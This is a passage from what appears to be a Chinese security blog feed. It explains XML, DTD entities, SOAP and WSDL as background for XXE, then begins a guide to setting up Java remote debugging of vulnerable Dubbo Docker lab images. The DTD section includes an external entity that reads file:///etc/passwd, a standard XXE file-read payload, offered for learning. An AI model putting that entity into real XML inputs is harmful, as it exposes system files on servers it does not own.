   <span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">"WEB"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>Erik T. Ray<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--XML文档中的所有文本均会被解析器解析。只有 CDATA 区段中的文本会被解析器忽略。当某个 XML 元素被解析时，其标签之间的文本也会被解析，所以PCDATA就是被解析的字符数据。--&gt;</span></span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">select id from user;</span><br><span class="line">]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>XML文档基于树结构，从根部开始扩展到树叶。如上示例，&lt;?xml..&gt;是XML声明，&lt;bookstore&gt;是根元素，book是bookstore的子元素，title、author、year、price是book的子元素</p><p><img src="/imgs/image-20200831201621950.png" alt="image-20200831201621950"></p></li><li><p>XML主要包含：声明、元素、属性、注释、CDATA区、转义字符等</p></li><li><p>一个元素可以包含下级元素、文本、属性中的一种或多种。如上，title是元素book的子元素，而book元素有属性category，title也有文本harry potter</p></li><li><p>XML命名空间：在XML中命名冲突可以通过名称前缀来避免。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h:table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h:tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h:td</span>&gt;</span>Apples<span class="tag">&lt;/<span class="name">h:td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h:td</span>&gt;</span>Bananas<span class="tag">&lt;/<span class="name">h:td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h:tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h:table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">f:table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">f:name</span>&gt;</span>African Coffee Table<span class="tag">&lt;/<span class="name">f:name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">f:width</span>&gt;</span>80<span class="tag">&lt;/<span class="name">f:width</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">f:length</span>&gt;</span>120<span class="tag">&lt;/<span class="name">f:length</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">f:table</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="0x01-XML-DTD"><a href="#0x01-XML-DTD" class="headerlink" title="0x01 XML DTD"></a>0x01 XML DTD</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块，可用来验证XML的合法性。它使用一系列合法的元素来定义文档的结构。</p><ol><li><p>DTD分为内部文档声明、外部文档声明和公共文档声明。</p></li><li><p>内部文档声明：DTD在XML文档内部进行声明&lt;!DOCTYPE root-element [element-declarations]&gt;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--DTD内部声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上DTD解析：</p><ul><li><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档。</li><li><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading、body”</li><li>*<em>!ELEMENT to、from、heading、body (第四-七行)定义 *</em>to、from、heading、body元素为PCDATA类型</li></ul></li><li><p>外部文档声明：在XML文件引入一个单独的DTD文档&lt;!DOCTYPE root-element SYSTEM “filename”&gt;</p><figure class="highlight plain"><figcaption><span>note.dtd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>在xml引入外部note.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!--外部引入DTD文档note.dtd--&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;Tove&lt;&#x2F;to&gt;</span><br><span class="line">  &lt;from&gt;Jani&lt;&#x2F;from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#39;t forget me this weekend!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure></li><li><p>公共文档声明：在XML文件中引入公共的文件，其实也属于外部文档声明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--格式--&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br><span class="line">&lt;!--示例--&gt;</span><br><span class="line">&lt;!DOCTYPE taglib PUBLIC &quot;-&#x2F;&#x2F;Sun Microsystems, Inc.&#x2F;&#x2F;DTD JSP Tag Library 1.2&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;java.sun.com&#x2F;dtd&#x2F;web-jsptaglibrary_1_2.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>外部引用支持的协议</p><table><thead><tr><th>程序</th><th>协议</th></tr></thead><tbody><tr><td>libxml2</td><td>file<br>http<br>ftp</td></tr><tr><td>PHP</td><td>file<br>http<br>ftp<br>php<br>compress.zlib<br>compress.bzip2<br>data<br>glob<br>phar<br>更多协议如<br>https、ftps、zip、ssh2.shell、ssh2.scp等协议需要扩展支持</td></tr><tr><td>JAVA</td><td>file<br/>http<br/>ftp<br/>jar<br>netdoc<br>mailto<br>gopher *</td></tr><tr><td>.NET</td><td>file<br/>http<br/>https<br>ftp</td></tr></tbody></table></li></ol><h2 id="0x02-DTD-实体"><a href="#0x02-DTD-实体" class="headerlink" title="0x02 DTD 实体"></a>0x02 DTD 实体</h2><ol><li><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量</p></li><li><p>实体根据数据类型分为字符实体、命名实体、参数实体，另外根据数据引用方式，也分为外部实体和内部实体。所以一个实体既是参数实体也是外部实体不难理解。</p></li><li><p>字符实体、命名实体统一为通用实体都是以一个&amp;开始，以;结尾，通用实体可以用在XML、DTD等，示例：”&test;”。参数实体是以%开始、;结尾，参数实体只能在DTD文档中使用，示例：”%test;”</p></li><li><p>内部实体声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--语法--&gt;</span><br><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--示例--&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure></li><li><p>外部实体声明，可引入本地资源[SYSTEM]和公共资源[PUBLIC]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">z&lt;!--语法--&gt;</span><br><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--示例--&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY taglib PUBLIC &quot;-&#x2F;&#x2F;Sun Microsystems, Inc.&#x2F;&#x2F;DTD JSP Tag Library 1.2&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;java.sun.com&#x2F;dtd&#x2F;web-jsptaglibrary_1_2.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;file&gt;&amp;file;&lt;&#x2F;file&gt;</span><br><span class="line">&lt;taglib&gt;&amp;taglib;&lt;&#x2F;taglib&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x03-了解SOAP"><a href="#0x03-了解SOAP" class="headerlink" title="0x03 了解SOAP"></a>0x03 了解SOAP</h2><p>SOAP（Simple Object Access Protocol，简单对象访问协议）是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息，简单来说SOAP 是用于访问网络服务的协议。</p><p>SOAP语法：</p><ul><li><strong>SOAP 消息必须用 XML 来编码</strong></li><li><strong>SOAP 消息必须使用 SOAP Envelope 命名空间</strong></li><li><strong>SOAP 消息必须使用 SOAP Encoding 命名空间</strong></li><li>SOAP 消息不能包含 DTD 引用</li><li>SOAP 消息不能包含 XML 处理指令</li></ul><p>SOAP消息基本结构</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2001/12/soap-envelope"</span> <span class="attr">soap:encodingStyle</span>=<span class="string">"http://www.w3.org/2001/12/soap-encoding"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SOAP故障处理soapenv或SOAP-ENV</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-了解WSDL"><a href="#0x04-了解WSDL" class="headerlink" title="0x04 了解WSDL"></a>0x04 了解WSDL</h2><p>WSDL（Web Services Description Language，网络服务描述语言）是一门<strong>基于 XML</strong> 的语言，用于描述 Web Services 以及如何对它们进行访问。</p><p><img src="/imgs/image-20200831211951566.png" alt="image-20200831211951566"></p><h3 id="WSDL绑定"><a href="#WSDL绑定" class="headerlink" title="WSDL绑定"></a>WSDL绑定</h3><p>WSDL 绑定可为 web service 定义消息格式和协议细节。runoob提供了绑定soap的例子</p><p><img src="/imgs/image-20200831212338946.png" alt="image-20200831212338946"></p><p>所以其实 wsdl与soap的关系在于：wsdl绑定服务的时候可以设定使用的协议，协议可以是soap、http、smtp、ftp等任何一种传输协议，除此以外wsdl还可以绑定jms、ejb及local java等等，不过都是需要对binding和service元素做扩展的，而且需要扩展服务器的功能以支持这种扩展。</p><h3 id="WSDL-UDDI"><a href="#WSDL-UDDI" class="headerlink" title="WSDL UDDI"></a>WSDL UDDI</h3><p>UDDI（“Universal Description, Discovery and Integration”，通用描述、发现与集成服务） 是一种目录服务，企业可以使用它对 Web services 进行注册和搜索。</p><p>参考链接：</p><p><a href="https://www.runoob.com/xml/" target="_blank" rel="noopener">https://www.runoob.com/xml/</a></p><p><a href="https://www.runoob.com/soap/" target="_blank" rel="noopener">https://www.runoob.com/soap/</a></p><p><a href="https://www.runoob.com/wsdl/" target="_blank" rel="noopener">https://www.runoob.com/wsdl/</a></p><p><a href="https://www.jianshu.com/p/8cd50bb9c7bd" target="_blank" rel="noopener">https://www.jianshu.com/p/8cd50bb9c7bd</a></p><p><a href="https://blog.csdn.net/vtopqx/article/details/86674184" target="_blank" rel="noopener">soap和wsdl区别说明</a></p><p><a href="https://blog.csdn.net/janchin/article/details/46849209" target="_blank" rel="noopener">https://blog.csdn.net/janchin/article/details/46849209</a></p><p><a href="https://www.w3school.com.cn/dtd/dtd_entities.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/dtd/dtd_entities.asp</a></p><p><a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">https://xz.aliyun.com/t/6887</a></p>]]></content>
      
      
      <categories>
          
          <category> XML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XML </tag>
            
            <tag> SOAP </tag>
            
            <tag> WSDL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java调试总结</title>
      <link href="2020/08/28/Java%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>2020/08/28/Java%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本文章已投稿seebug：<a href="https://paper.seebug.org/1316/" target="_blank" rel="noopener">https://paper.seebug.org/1316/</a> 【有点尴尬的是排版乱的】</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近一直在Java相关漏洞进行分析学习，调试环境就是第一步需要准备的，所以总结一下，也是为跟我一样想要接触漏洞调试分析的萌新提供一些参考吧。</p><p>文笔粗糙，如有不当，请大佬批评指正。</p><h2 id="0x01-调试基本方法"><a href="#0x01-调试基本方法" class="headerlink" title="0x01 调试基本方法"></a>0x01 调试基本方法</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><ul><li>Intelli IDEA 2019.2.4</li><li>Windows10</li></ul><p>关于IDEA的安装破解这里就不说了，网上大把文章可以参考。</p><h3 id="IDEA的调试基本用法"><a href="#IDEA的调试基本用法" class="headerlink" title="IDEA的调试基本用法"></a>IDEA的调试基本用法</h3><img src="/imgs/image-20200730141940843.png" alt="image-20200730141940843" style="zoom:80%;" /><p>如上图，我们挨个简单介绍下这些按钮和区域，如果想要更多详细信息，建议看下官网<a href="https://www.jetbrains.com/help/idea/debugging-code.html" target="_blank" rel="noopener">IntelliJ IDEA Debug code</a></p><ol><li><p>调用栈：主要是在调试过程中的一些方法调用栈的显示</p></li><li><p>变量区：调试程序中的变量显示，可以查看和<strong>更改</strong>变量值</p></li><li><p>调试按钮：</p><p>方框内从左到右按钮分别是：</p><p><img src="/imgs/image-20200730150108545.png" alt="image-20200730150108545" style="zoom:45%;" align='left'/>:Step Over (F8)，步过，一步一步往下，有方法不会进入内部</p><p><img src="/imgs/image-20200730150238346.png" alt="image-20200730150238346" style="zoom:50%;" align='left'/>:Step Into (F7)，步入，有方法可以进入方法内部，一般用于进入自定义方法内，不会进入官方类库的方法</p><p><img src="/imgs/image-20200730150321594.png" alt="image-20200730150321594" style="zoom:70%;" align='left'/>: Force Step Into (Alt+Shift+F7)，强制步入，能进入任何方法，包括官方类库的方法</p><p><img src="/imgs/image-20200730150401940.png" alt="image-20200730150401940" style="zoom:67%;" align='left'/>: Step Out (Shift+F8)，步出，退出当前方法到方法调用处</p><p><img src="/imgs/image-20200730150445665.png" alt="image-20200730150445665" style="zoom:50%;" align='left'/>:Drop Frame，回退断点，回退frame</p><p><img src="/imgs/image-20200730150540757.png" alt="image-20200730150540757" style="zoom:60%;" align='left'/>:Run to Cursor (Alt+F9)：运行到光标处，可以运行到光标的那行，到那时中途有断点会停在断点。</p><p>其实除了上面的按钮，还有Force Run to Cursor(Ctrl+Alt+F9)、Improve stepping speed、Step out of code block﻿等可以在Run菜单栏找到。</p></li><li><p>运行工具按钮：可以在这里重新运行、结束、查看所有断点等</p><p><img src="/imgs/image-20200730150633338.png" alt="image-20200730150633338" style="zoom:67%;" align='left'/>:Rerun，重新运行</p><p><img src="/imgs/image-20200730150922850.png" alt="image-20200730150922850" style="zoom:67%;" align='left'/>:Resume Program (F9)：恢复程序，运行程序，遇到断点再停止</p><p><img src="/imgs/image-20200730151001792.png" alt="image-20200730151001792" style="zoom:67%;" align='left'/>:Stop，停止运行</p><p><img src="/imgs/image-20200730151042932.png" alt="image-20200730151042932" style="zoom:50%;" align='left'/>:View Breakpoints，查看所有断点</p><p><img src="/imgs/image-20200730151129937.png" alt="image-20200730151129937" style="zoom:50%;" align='left'/>:View Breakpoints，使所有断点失效</p></li><li><p>计算表达式：Evaluate Expression (Alt+F8)，在我看来是一个非常好用的计算器，可以计算表达式、方法return值等</p></li></ol><p>除了上面的基本用法，<a href="https://www.jetbrains.com/help/idea/altering-the-program-s-execution-flow.html" target="_blank" rel="noopener">官方</a>还为我们准备了一些实用的技巧。</p><ol><li><p><img src="/imgs/image-20200730150445665.png" alt="image-20200730150445665" style="zoom:50%;" align='left'/>:Drop Frame，回退断点，上面提到了这个。我们在debug分析的过程中经常会有Step多了，错过了关键地方或者想回去重看下，就可以用这个。</p></li><li><p>Use breakpoint expressions﻿，断点表达式：可以设置断点的条件，当满足条件才暂停，这个可以在循环或者某个确认</p><p><img src="/imgs/image-20200730162129273.png" alt="image-20200730162129273"></p></li></ol><h2 id="0x02-远程调试"><a href="#0x02-远程调试" class="headerlink" title="0x02 远程调试"></a>0x02 远程调试</h2><p>我在分析漏洞的时候，会用到远程调试，多是docker+IDEA，所以这里想总结下便于以后远程分析各种java相关漏洞。</p><h3 id="Java远程调试基础知识"><a href="#Java远程调试基础知识" class="headerlink" title="Java远程调试基础知识"></a>Java远程调试基础知识</h3><p>Java远程调试的原理是<strong>两个VM之间</strong>通过debug协议<strong>JDWP（Java Debug Wire Protocol）</strong>进行通信，确保本地的Java的源代码与目标应用程序<strong>一致</strong>就可以成功调试，在这里我们通常会认为远程JVM是debug服务器，本地JVM是debug客户端。</p><p>知道这个我们就抓住了重点。IDEA为我们提供了连接远程调试服务，只要像下图配置远程JVM就可以去连接，而且IDEA会帮我们自动生成命令行，可以为远程JVM提供参考。</p><p><img src="/imgs/image-20200731095451460.png" alt="image-20200731095451460"></p><p>Debugger mode：指的是本地的debug模式，这里有两种选择Attach和Listen，Attach代表主动去连接远程JVM，那么远程JVM就处于监听状态，Listen代表本地监听远程JVM，我目前接触的比较多的是Attach模式，所以下面介绍的也都是这种模式。</p><p>不同的JDK版本，JVM命令行参数可能不同，这里仅介绍下JDK 5-8的命令行参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;1234</span><br><span class="line">transport&#x3D;dt_socket：socket方式连接</span><br><span class="line">server&#x3D;y：yes，监听debug客户端请求</span><br><span class="line">suspend&#x3D;n：no，暂不挂起</span><br><span class="line">address&#x3D;1234：监听端口1234</span><br></pre></td></tr></table></figure><h3 id="远程调试实例"><a href="#远程调试实例" class="headerlink" title="远程调试实例"></a>远程调试实例</h3><p>在分析漏洞时，经常会在vulhub、vulfocus等拉取docker镜像来进行复现，但是如果这时候想要进行代码深入分析的时候，就需要用到远程调试。以下用两个例子进行说明。</p><h4 id="场景一：Apache-Dubbo漏洞docker远程分析调试，内含jar包。"><a href="#场景一：Apache-Dubbo漏洞docker远程分析调试，内含jar包。" class="headerlink" title="场景一：Apache Dubbo漏洞docker远程分析调试，内含jar包。"></a>场景一：Apache Dubbo漏洞docker远程分析调试，内含jar包。</h4><p>直接在后台从vulfocus进行拉取镜像或者vulfocus页面拉取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/dubbo-cve_2020_1948</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20200822235926488.png" alt="image-20200822235926488"></p><p>在页面启动dubbo-cve_2020_1948容器</p><p><img src="/imgs/image-20200823001226137.png" alt="image-20200823001226137"></p><p><img src="/imgs/image-20200823001328548.png" alt="image-20200823001328548"></p><p>查看容器相关信息，如图，能看到环境变量和启动命令”java -jar /demo/demo.jar”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 524</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20200823001500000.png" alt="image-20200823001500000"></p><p>现在我们需要将容器环境变量和启动命令做修改，这里我使用docker-compose来启动服务。docker-compose.yml文件如下，添加环境调试变量JAVA_OPT、命令添加”-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=18888”，端口注意对于添加18888。</p><figure class="highlight yml"><figcaption><span>docker-compose.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">api:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">vulfocus/dubbo-cve_2020_1948</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPTS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=18888</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">dubbo_test</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">java</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=18888</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-jar</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/demo/demo.jar</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"12345:12345"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"18888:18888"</span></span><br></pre></td></tr></table></figure><p>开启docker-compose up -d</p><p><img src="/imgs/image-20200823000427861.png" alt="image-20200823000427861"></p><p>到此docker环境配置完成，接下来配置本地IDEA环境</p><p>首先用docker cp将上面执行的demo.jar包拷贝出来，然后传输到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 524:/demo/demo.jar .</span><br></pre></td></tr></table></figure><p>创建一个新项目，将demo.jar作为libraries加进来</p><img src="/imgs/image-20200823002859886.png" alt="image-20200823002859886" style="zoom:50%;" /><p>在项目下创建一个lib目录，然后打开demo.jar里面的lib下的所有jar拷贝到新建的lib下，并将新建的lib添加到libraries</p><p><img src="/imgs/image-20200823003054337.png" alt="image-20200823003054337"></p><p>然后配置远程调试JVM信息准备连接</p><p><img src="/imgs/image-20200823003541976.png" alt="image-20200823003541976"></p><p>配置完成后，打上断点发送包就可以正常拦截分析了</p><p><img src="/imgs/image-20200823003502751.png" alt="image-20200823003502751"></p><p>这种场景适用于直接执行jar包，根据实际情况修改相关信息即可。当我们的复现docker环境是用包含了war包在tomcat下部署的，那我们可以采用两种方法，一种即将war拷贝到本地部署然后调试，另一种就是修改容器的tomcat相关远程调试参数然后拷贝ROOT下的src到项目然后分析，这里说明下如何tomcat远程调试参数：可以直接进入容器修改catalina.sh，也可以像上面方式写一个docker-compose.yml添加上环境变量。所以类似情况根据实际情况变通即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tomcat远程调试</span></span><br><span class="line">CATALINA_OPTS=<span class="string">"-Xdebug 